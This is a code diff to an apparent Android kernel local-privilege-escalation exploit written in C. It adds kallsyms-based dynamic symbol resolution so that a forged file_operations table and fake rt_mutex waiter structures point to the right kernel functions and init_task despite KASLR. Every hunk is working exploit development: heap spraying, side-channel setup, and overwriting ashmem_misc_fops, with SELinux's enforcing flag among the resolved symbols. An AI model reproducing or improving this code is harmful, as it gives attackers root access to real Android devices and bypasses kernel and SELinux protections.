@@ -22,8 +22,27 @@ uintptr_t fake_fops;
 uintptr_t binwrite_target;
 char ashmem_path[256] = "/dev/ashmem";
 
+/* 动态符号解析全局变量 (kallsyms 可读时填充) */
+uint64_t g_dyn_kaslr_base = 0;
+uint64_t g_dyn_ashmem_misc_fops = 0;
+uint64_t g_dyn_init_task = 0;
+uint64_t g_dyn_root_task_group = 0;
+uint64_t g_dyn_ashmem_ioctl = 0;
+uint64_t g_dyn_ashmem_compat_ioctl = 0;
+uint64_t g_dyn_ashmem_mmap = 0;
+uint64_t g_dyn_ashmem_open = 0;
+uint64_t g_dyn_ashmem_release = 0;
+uint64_t g_dyn_ashmem_show_fdinfo = 0;
+uint64_t g_dyn_configfs_read_iter = 0;
+uint64_t g_dyn_configfs_bin_write_iter = 0;
+uint64_t g_dyn_copy_splice_read = 0;
+uint64_t g_dyn_noop_llseek = 0;
+uint64_t g_dyn_selinux_enforcing = 0;
+uint64_t g_dyn_kallsyms_lookup_name = 0;
+int g_dyn_symbols_ready = 0;
+
 void setup_kernelsnitch(void) {
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_CONF);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 }
@@ -266,6 +285,56 @@ uintptr_t text_addr(uintptr_t image_addr) {
   return kaslr_image_addr(image_addr);
 }
 
+uintptr_t dyn_text_addr(uintptr_t static_image_addr) {
+  if (g_dyn_symbols_ready) {
+    /* 动态地址优先: 检查 static_image_addr 是否有对应的动态地址 */
+    if (static_image_addr == ASHMEM_MISC_FOPS && g_dyn_ashmem_misc_fops)
+      return g_dyn_ashmem_misc_fops;
+    if (static_image_addr == INIT_TASK && g_dyn_init_task)
+      return g_dyn_init_task;
+    if (static_image_addr == ROOT_TASK_GROUP && g_dyn_root_task_group)
+      return g_dyn_root_task_group;
+    if (static_image_addr == ASHMEM_IOCTL && g_dyn_ashmem_ioctl)
+      return g_dyn_ashmem_ioctl;
+    if (static_image_addr == ASHMEM_COMPAT_IOCTL && g_dyn_ashmem_compat_ioctl)
+      return g_dyn_ashmem_compat_ioctl;
+    if (static_image_addr == ASHMEM_MMAP && g_dyn_ashmem_mmap)
+      return g_dyn_ashmem_mmap;
+    if (static_image_addr == ASHMEM_OPEN && g_dyn_ashmem_open)
+      return g_dyn_ashmem_open;
+    if (static_image_addr == ASHMEM_RELEASE && g_dyn_ashmem_release)
+      return g_dyn_ashmem_release;
+    if (static_image_addr == ASHMEM_SHOW_FDINFO && g_dyn_ashmem_show_fdinfo)
+      return g_dyn_ashmem_show_fdinfo;
+    if (static_image_addr == CONFIGFS_READ_ITER && g_dyn_configfs_read_iter)
+      return g_dyn_configfs_read_iter;
+    if (static_image_addr == CONFIGFS_BIN_WRITE_ITER && g_dyn_configfs_bin_write_iter)
+      return g_dyn_configfs_bin_write_iter;
+    if (static_image_addr == COPY_SPLICE_READ && g_dyn_copy_splice_read)
+      return g_dyn_copy_splice_read;
+    if (static_image_addr == NOOP_LLSEEK && g_dyn_noop_llseek)
+      return g_dyn_noop_llseek;
+  }
+  return text_addr(static_image_addr);
+}
+
+uintptr_t dyn_data_addr(uintptr_t static_image_addr) {
+  if (g_dyn_symbols_ready && g_dyn_kaslr_base) {
+    /* 动态地址优先: 获取动态运行时地址，转换为物理地址别名 */
+    uint64_t dyn_addr = 0;
+    if (static_image_addr == ASHMEM_MISC_FOPS && g_dyn_ashmem_misc_fops)
+      dyn_addr = g_dyn_ashmem_misc_fops;
+    /* 其他符号通常不需要 data_addr，只 ASHMEM_MISC_FOPS 需要 */
+    if (dyn_addr) {
+      /* 运行时地址 → 物理偏移 → 物理地址别名 */
+      uintptr_t off = (uintptr_t)(dyn_addr - g_dyn_kaslr_base);
+      uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+      return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+    }
+  }
+  return data_addr(static_image_addr);
+}
+
 uintptr_t slide_canon_addr(uintptr_t data_alias) {
   return kaslr_base + p0_alias_image_offset(data_alias);
 }
@@ -288,15 +357,15 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
-  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
-  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
-  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
-  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
-  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
-  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
-  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
-  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
-  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+  put64(p, off + FOPS_READ_ITER_OFF, dyn_text_addr(CONFIGFS_READ_ITER));
+  put64(p, off + FOPS_WRITE_ITER_OFF, dyn_text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, off + FOPS_IOCTL_OFF, dyn_text_addr(ASHMEM_IOCTL));
+  put64(p, off + FOPS_COMPAT_IOCTL_OFF, dyn_text_addr(ASHMEM_COMPAT_IOCTL));
+  put64(p, off + FOPS_MMAP_OFF, dyn_text_addr(ASHMEM_MMAP));
+  put64(p, off + FOPS_OPEN_OFF, dyn_text_addr(ASHMEM_OPEN));
+  put64(p, off + FOPS_RELEASE_OFF, dyn_text_addr(ASHMEM_RELEASE));
+  put64(p, off + FOPS_SPLICE_READ_OFF, dyn_text_addr(COPY_SPLICE_READ));
+  put64(p, off + FOPS_SHOW_FDINFO_OFF, dyn_text_addr(ASHMEM_SHOW_FDINFO));
 }
 
 int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
@@ -452,22 +521,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_fops = payload_base + FOPS_TABLE_OFF;
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = dyn_data_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
+    fake_parent = dyn_data_addr(ASHMEM_MISC_FOPS) - 8;
     fake_right = fake_fops;
     fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
   uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_right = dyn_data_addr(ASHMEM_MISC_FOPS);
   uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
+  uint64_t waiter_task = dyn_text_addr(INIT_TASK);
+  uint64_t task_group = dyn_text_addr(ROOT_TASK_GROUP);
+  uint64_t pi_top_task = dyn_text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
@@ -556,7 +625,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
 
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_CONF);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 
